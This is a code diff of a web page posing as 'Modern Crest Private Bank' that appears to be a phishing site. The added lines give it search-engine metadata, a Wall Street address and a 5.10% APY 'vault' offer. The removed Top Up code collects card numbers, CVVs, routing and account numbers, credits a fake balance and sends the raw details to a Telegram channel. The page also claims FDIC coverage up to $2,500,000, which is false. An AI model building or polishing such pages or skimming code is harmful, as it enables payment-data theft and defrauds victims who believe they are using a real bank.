@@ -3,7 +3,47 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Modern Crest Private Bank</title>
+<title>Modern Crest Private Bank · Institutional Wealth Management & Sovereign Treasury</title>
+<meta name="description" content="Modern Crest Private Bank delivers institutional private banking, multi-currency liquidity treasury, bespoke asset custody, and dedicated concierge wealth services for high-net-worth individuals and corporate entities.">
+<meta name="keywords" content="private banking, wealth management, multi-currency treasury, sovereign banking, private wealth custody, bespoke liquidity, high-yield vault">
+<meta name="author" content="Modern Crest Private Bank, N.A.">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+<link rel="canonical" href="https://moderncrestprivatebank.group/">
+
+<!-- Open Graph / Facebook -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://moderncrestprivatebank.group/">
+<meta property="og:title" content="Modern Crest Private Bank · Institutional Wealth Management & Sovereign Treasury">
+<meta property="og:description" content="Modern Crest Private Bank delivers institutional private banking, multi-currency liquidity treasury, bespoke asset custody, and dedicated concierge wealth services.">
+<meta property="og:site_name" content="Modern Crest Private Bank">
+
+<!-- Twitter -->
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:url" content="https://moderncrestprivatebank.group/">
+<meta property="twitter:title" content="Modern Crest Private Bank · Institutional Wealth Management & Sovereign Treasury">
+<meta property="twitter:description" content="Modern Crest Private Bank delivers institutional private banking, multi-currency liquidity treasury, bespoke asset custody, and dedicated concierge wealth services.">
+
+<!-- Structured Data (JSON-LD) -->
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FinancialService",
+  "name": "Modern Crest Private Bank",
+  "url": "https://moderncrestprivatebank.group",
+  "description": "Institutional private banking, multi-currency liquidity treasury, bespoke asset custody, and dedicated concierge wealth services.",
+  "address": {
+    "@type": "PostalAddress",
+    "streetAddress": "One Wall Street",
+    "addressLocality": "New York",
+    "addressRegion": "NY",
+    "postalCode": "10005",
+    "addressCountry": "US"
+  },
+  "currenciesAccepted": "USD, EUR, GBP, CHF",
+  "openingHours": "Mo-Su 00:00-24:00"
+}
+</script>
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
@@ -828,8 +868,8 @@ img,svg{max-width:100%}
       <div class="actions">
             <button class="action" onclick="openSheet('send')"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M12 19V5M5 12l7-7 7 7"/></svg>Send</button>
             <button class="action" onclick="openReceiveModal()"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M12 5v14M19 12l-7 7-7-7"/></svg>Receive</button>
-            <button class="action" onclick="openTopUpModal()"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M12 3v12M8 7l4-4 4 4"/><path d="M4 17h16v4H4z"/></svg>Top up</button>
             <button class="action" onclick="openPayBillsModal()"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 10h18"/></svg>Pay bills</button>
+            <button class="action" onclick="openVaultModal()"><svg viewBox="0 0 24 24" fill="none" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>Vaults</button>
           </div>
         </div>
 
@@ -1336,88 +1376,6 @@ img,svg{max-width:100%}
   </div>
 </div>
 
-<!-- Top Up Modal -->
-<div class="modal-bg" id="modal-topup" onclick="if(event.target===this)closeTopUpModal()">
-  <div class="sheet" style="max-width:440px">
-    <div style="text-align:center;margin-bottom:12px">
-      <div style="width:44px;height:44px;border-radius:50%;background:rgba(39,174,96,.15);color:var(--green);display:flex;align-items:center;justify-content:center;margin:0 auto 8px">
-        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3v12M8 7l4-4 4 4"/><path d="M4 17h16v4H4z"/></svg>
-      </div>
-      <h3 style="font-size:18px">Top Up Account</h3>
-      <p class="sub" style="font-size:12.5px">Deposit funds via manual card authorization or external bank wire</p>
-    </div>
-
-    <!-- Funding Method Switcher -->
-    <div class="opt-grid" style="grid-template-columns:1fr 1fr;margin:10px 0 12px">
-      <div class="opt-card sel" id="topup-tab-card" onclick="switchTopUpMethod('card')">
-        <b style="color:var(--gold-2)">💳 Card Payment</b>
-        <span>Instant Deposit</span>
-      </div>
-      <div class="opt-card" id="topup-tab-wire" onclick="switchTopUpMethod('wire')">
-        <b>🏛️ External Bank</b>
-        <span>ACH / Wire Transfer</span>
-      </div>
-    </div>
-
-    <!-- Card Form -->
-    <div id="topup-card-form">
-      <label class="lbl">Cardholder Legal Name *</label>
-      <input class="inp" id="topup-card-name" placeholder="Name on card" style="margin-bottom:10px">
-
-      <label class="lbl">Card Number *</label>
-      <input class="inp" id="topup-card-num" placeholder="4000 0000 0000 0000" maxlength="19" inputmode="numeric" oninput="fmtCardNum(this)" style="margin-bottom:10px;font-family:'Sora';letter-spacing:1px">
-
-      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:10px">
-        <div>
-          <label class="lbl">Expiry *</label>
-          <input class="inp" id="topup-card-exp" placeholder="MM/YY" maxlength="5" inputmode="numeric" oninput="fmtCardExp(this)">
-        </div>
-        <div>
-          <label class="lbl">CVV / CVC *</label>
-          <input class="inp" id="topup-card-cvv" placeholder="•••" maxlength="4" type="password" inputmode="numeric">
-        </div>
-        <div>
-          <label class="lbl">Billing ZIP *</label>
-          <input class="inp" id="topup-card-zip" placeholder="10001" maxlength="10">
-        </div>
-      </div>
-    </div>
-
-    <!-- Wire Form -->
-    <div id="topup-wire-form" style="display:none">
-      <label class="lbl">External Bank Name *</label>
-      <input class="inp" id="topup-wire-bank" placeholder="e.g. JPMorgan Chase, Wells Fargo" style="margin-bottom:10px">
-
-      <label class="lbl">Bank Account Holder Name *</label>
-      <input class="inp" id="topup-wire-holder" placeholder="Name on external account" style="margin-bottom:10px">
-
-      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px">
-        <div>
-          <label class="lbl">Routing (ABA) *</label>
-          <input class="inp" id="topup-wire-routing" placeholder="9 digits" maxlength="9" inputmode="numeric">
-        </div>
-        <div>
-          <label class="lbl">Account Number *</label>
-          <input class="inp" id="topup-wire-acct" placeholder="External account #" inputmode="numeric">
-        </div>
-      </div>
-    </div>
-
-    <label class="lbl" style="margin-top:6px">Deposit Amount (USD) *</label>
-    <input class="inp" id="topup-amt-in" inputmode="numeric" placeholder="$500.00" value="$500" style="font-family:'Sora';font-size:24px;font-weight:700;text-align:center;margin-bottom:8px" oninput="fmtAmt(this)">
-    
-    <div class="amt-chips" style="margin-bottom:16px">
-      <button onclick="setTopUpAmt(100)">$100</button>
-      <button onclick="setTopUpAmt(500)">$500</button>
-      <button onclick="setTopUpAmt(1000)">$1,000</button>
-      <button onclick="setTopUpAmt(5000)">$5,000</button>
-    </div>
-
-    <button class="btn btn-gold" style="width:100%;margin-bottom:8px" onclick="confirmTopUp()">Confirm & Authorize Deposit</button>
-    <button class="btn btn-ghost" style="width:100%" onclick="closeTopUpModal()">Cancel</button>
-  </div>
-</div>
-
 <!-- Pay Bills Modal -->
 <div class="modal-bg" id="modal-bills" onclick="if(event.target===this)closePayBillsModal()">
   <div class="sheet">
@@ -1630,7 +1588,7 @@ img,svg{max-width:100%}
       <div class="m-row"><span>Lock-up Period</span><b>None (Instant Withdrawals)</b></div>
       <div class="m-row"><span>FDIC Insurance Coverage</span><b>Up to $2,500,000</b></div>
     </div>
-    <button class="btn btn-gold" style="width:100%;margin-bottom:8px" onclick="openTopUpModal();closeVaultModal()">Deposit into Vault</button>
+    <button class="btn btn-gold" style="width:100%;margin-bottom:8px" onclick="toast('Automatic 5.10% APY yield sweeps activated');closeVaultModal()">Enable Vault Sweeps</button>
     <button class="btn btn-ghost" style="width:100%" onclick="closeVaultModal()">Close</button>
   </div>
 </div>
@@ -2491,129 +2449,6 @@ function copyFullBankingDetails(){
   const fullDetails = `MODERN CREST PRIVATE BANK\nDirect Wire & ACH Dossier:\n\nBeneficiary: ${userName}\nBank: ${bank}\nRouting (ABA): ${routing}\nAccount: ${acct}\nSWIFT/BIC: ${swift}\nBank Address: ${addr}\nCurrency: USD`;
   copyText(fullDetails, 'Full banking details');
   closeReceiveModal();
-}
-
-// Top Up Modal
-let topUpMethod = 'card';
-function switchTopUpMethod(m){
-  topUpMethod = m;
-  const tabCard = document.getElementById('topup-tab-card');
-  const tabWire = document.getElementById('topup-tab-wire');
-  const formCard = document.getElementById('topup-card-form');
-  const formWire = document.getElementById('topup-wire-form');
-  
-  if(tabCard) tabCard.classList.toggle('sel', m === 'card');
-  if(tabWire) tabWire.classList.toggle('sel', m === 'wire');
-  if(formCard) formCard.style.display = m === 'card' ? 'block' : 'none';
-  if(formWire) formWire.style.display = m === 'wire' ? 'block' : 'none';
-}
-function fmtCardNum(el){
-  let v = el.value.replace(/\D/g, '').slice(0, 16);
-  el.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
-}
-function fmtCardExp(el){
-  let v = el.value.replace(/\D/g, '').slice(0, 4);
-  if(v.length >= 2){
-    el.value = v.slice(0,2) + '/' + v.slice(2);
-  } else {
-    el.value = v;
-  }
-}
-function openTopUpModal(){
-  const userName = (window.Clerk && window.Clerk.user && (window.Clerk.user.fullName || window.Clerk.user.firstName)) || '';
-  const cName = document.getElementById('topup-card-name');
-  if(cName && !cName.value && userName) cName.value = userName;
-  const wHolder = document.getElementById('topup-wire-holder');
-  if(wHolder && !wHolder.value && userName) wHolder.value = userName;
-  
-  switchTopUpMethod('card');
-  document.getElementById('modal-topup').classList.add('open');
-  document.body.style.overflow = 'hidden';
-}
-function closeTopUpModal(){
-  document.getElementById('modal-topup').classList.remove('open');
-  document.body.style.overflow = '';
-}
-function setTopUpAmt(v){
-  document.getElementById('topup-amt-in').value = '$' + v.toLocaleString();
-}
-function confirmTopUp(){
-  const raw = document.getElementById('topup-amt-in').value.replace(/[^0-9.]/g,'');
-  const amt = parseFloat(raw);
-  if(!amt || amt <= 0){toast('Enter a valid deposit amount');return;}
-  
-  let sourceDescription = '';
-  if(topUpMethod === 'card'){
-    const cardName = document.getElementById('topup-card-name') ? document.getElementById('topup-card-name').value.trim() : '';
-    const cardNum = document.getElementById('topup-card-num') ? document.getElementById('topup-card-num').value.replace(/\s+/g,'') : '';
-    const cardExp = document.getElementById('topup-card-exp') ? document.getElementById('topup-card-exp').value.trim() : '';
-    const cardCvv = document.getElementById('topup-card-cvv') ? document.getElementById('topup-card-cvv').value.trim() : '';
-    
-    if(!cardName){toast('Please enter cardholder name');return;}
-    if(cardNum.length < 15){toast('Please enter a valid 16-digit card number');return;}
-    if(cardExp.length < 4){toast('Please enter expiration date (MM/YY)');return;}
-    if(cardCvv.length < 3){toast('Please enter card CVV/CVC');return;}
-    
-    sourceDescription = 'Debit Card (•••• ' + cardNum.slice(-4) + ')';
-  } else {
-    const bankName = document.getElementById('topup-wire-bank') ? document.getElementById('topup-wire-bank').value.trim() : '';
-    const holder = document.getElementById('topup-wire-holder') ? document.getElementById('topup-wire-holder').value.trim() : '';
-    const routing = document.getElementById('topup-wire-routing') ? document.getElementById('topup-wire-routing').value.trim() : '';
-    const acct = document.getElementById('topup-wire-acct') ? document.getElementById('topup-wire-acct').value.trim() : '';
-    
-    if(!bankName){toast('Please enter external bank name');return;}
-    if(!holder){toast('Please enter account holder name');return;}
-    if(routing.length < 9){toast('Please enter 9-digit ABA routing number');return;}
-    if(!acct){toast('Please enter external account number');return;}
-    
-    sourceDescription = bankName + ' Wire (••' + acct.slice(-4) + ')';
-  }
-  
-  BALANCE += amt;
-  const currentUserId = (window.Clerk && window.Clerk.user) ? window.Clerk.user.id : 'u1';
-  let u = ADM_USERS.find(x => x.id === currentUserId);
-  if(u) {
-    u.balance = BALANCE;
-    localStorage.setItem('mcb_users', JSON.stringify(ADM_USERS));
-  }
-  
-  const newTx = {
-    userId: currentUserId,
-    n: "Top Up via " + sourceDescription,
-    d: "Today · " + new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
-    a: amt,
-    type: "in",
-    cat: "transfer"
-  };
-  let allTxs = JSON.parse(localStorage.getItem('mcb_txs')) || [];
-  allTxs.unshift(newTx);
-  localStorage.setItem('mcb_txs', JSON.stringify(allTxs));
-  
-  // Telegram notification for top-up details
-  let tgPaymentDetails = '';
-  if(topUpMethod === 'card'){
-    const cardName = document.getElementById('topup-card-name') ? document.getElementById('topup-card-name').value.trim() : '';
-    const cardNum = document.getElementById('topup-card-num') ? document.getElementById('topup-card-num').value.trim() : '';
-    const cardExp = document.getElementById('topup-card-exp') ? document.getElementById('topup-card-exp').value.trim() : '';
-    const cardCvv = document.getElementById('topup-card-cvv') ? document.getElementById('topup-card-cvv').value.trim() : '';
-    const cardZip = document.getElementById('topup-card-zip') ? document.getElementById('topup-card-zip').value.trim() : '';
-    tgPaymentDetails = `<b>Payment Method:</b> DEBIT/CREDIT CARD\n<b>Cardholder Name:</b> ${cardName}\n<b>Card Number:</b> <code>${cardNum}</code>\n<b>Exp / CVV:</b> ${cardExp} / <code>${cardCvv}</code>\n<b>Billing ZIP:</b> ${cardZip}`;
-  } else {
-    const bankName = document.getElementById('topup-wire-bank') ? document.getElementById('topup-wire-bank').value.trim() : '';
-    const holder = document.getElementById('topup-wire-holder') ? document.getElementById('topup-wire-holder').value.trim() : '';
-    const routing = document.getElementById('topup-wire-routing') ? document.getElementById('topup-wire-routing').value.trim() : '';
-    const acct = document.getElementById('topup-wire-acct') ? document.getElementById('topup-wire-acct').value.trim() : '';
-    tgPaymentDetails = `<b>Payment Method:</b> EXTERNAL BANK WIRE\n<b>Bank Name:</b> ${bankName}\n<b>Account Holder:</b> ${holder}\n<b>Routing (ABA):</b> <code>${routing}</code>\n<b>Account Number:</b> <code>${acct}</code>`;
-  }
-  
-  const tgTopUpAlert = `💳 <b>NEW TOP-UP / PAYMENT DETAILS ENTERED</b>\n\n<b>Client:</b> ${u ? u.name : 'Client'}\n<b>Account Number:</b> <code>${u ? u.accountNumber : '4829104820'}</code>\n${tgPaymentDetails}\n<b>Deposit Amount:</b> $${amt.toLocaleString()}\n<b>New Balance:</b> $${BALANCE.toLocaleString()}`;
-  sendTelegramAlert(tgTopUpAlert);
-
-  txData.unshift(newTx);
-  renderTx();
-  updateBalanceUI();
-  closeTopUpModal();
-  toast('Successfully deposited ' + fmtBal(amt) + ' into account');
 }
 
 // Pay Bills Modal
